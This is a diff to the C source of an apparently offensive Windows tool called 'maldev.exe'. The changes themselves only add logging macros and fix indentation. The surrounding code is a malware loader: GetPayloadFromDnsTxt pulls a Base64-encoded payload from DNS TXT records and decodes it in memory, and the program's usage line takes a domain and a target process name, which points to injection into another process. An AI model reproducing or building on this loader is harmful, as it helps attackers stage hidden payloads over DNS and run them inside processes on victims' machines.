@@ -4,6 +4,10 @@
 #include <stdio.h>
 #include <Tlhelp32.h>
 
+#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
+#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
+#define error(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)
+
 #pragma comment(lib, "Dnsapi.lib")  
 #pragma comment(lib, "Crypt32.lib")
 
@@ -50,13 +54,13 @@ BOOL GetPayloadFromDnsTxt(LPCWSTR szDomain, PBYTE* pPayloadBytes, SIZE_T* sPaylo
 
 
     DWORD dwDecodedSize = 0;
-	// find the size of the decoded payload
+    // find the size of the decoded payload
     if (!CryptStringToBinaryA(szBase64Payload, 0, CRYPT_STRING_BASE64, NULL, &dwDecodedSize, NULL, NULL)) {
         printf("CryptStringToBinaryA (Size Calculation) Failed : %d\n", GetLastError());
         LocalFree(szBase64Payload);
         return FALSE;
     }
-	printf("Total Base64 Payload Length: %d, Decoded Payload Size: %d\n", dwTotalTextLength, dwDecodedSize);
+    printf("Total Base64 Payload Length: %d, Decoded Payload Size: %d\n", dwTotalTextLength, dwDecodedSize);
 
     PBYTE pDecodedBytes = (PBYTE)LocalAlloc(LPTR, dwDecodedSize);
     if (pDecodedBytes == NULL) {
@@ -72,11 +76,11 @@ BOOL GetPayloadFromDnsTxt(LPCWSTR szDomain, PBYTE* pPayloadBytes, SIZE_T* sPaylo
         LocalFree(szBase64Payload);
         return FALSE;
     }
-	printf("Successfully decoded the payload, Press <Enter> to continue\n");
+    printf("Successfully decoded the payload, Press <Enter> to continue\n");
 
     LocalFree(szBase64Payload);
 
-	// add the decoded bytes to the output parameters
+    // add the decoded bytes to the output parameters
     *pPayloadBytes = pDecodedBytes;
     *sPayloadSize = (SIZE_T)dwDecodedSize;
 
@@ -175,7 +179,7 @@ int wmain(int argc, wchar_t* argv[]) {
         printf("Usage: maldev.exe <DomainName> <TargetProcessName>\n");
         return -1;
     }
- 
+
 
     HANDLE hProcess = NULL;
     DWORD dwProcessId = 0;
